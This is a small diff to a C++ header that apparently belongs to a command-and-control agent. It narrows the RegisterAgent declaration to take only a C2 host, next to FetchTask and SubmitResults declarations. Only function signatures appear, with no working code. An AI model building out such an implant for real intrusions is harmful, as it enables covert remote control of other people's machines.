@@ -27,7 +27,7 @@ namespace interpreter {
 }
 
 namespace communication {
-    nlohmann::json RegisterAgent(const std::wstring& c2_host, const std::wstring& os, const std::wstring& domain, const std::wstring& hostname);
+    nlohmann::json RegisterAgent(const std::wstring& c2_host);
     nlohmann::json FetchTask(const std::wstring& c2_host, const std::wstring& agent_id);
     bool SubmitResults(const std::wstring& c2_host, const std::wstring& agent_id, const nlohmann::json& task_result);
 
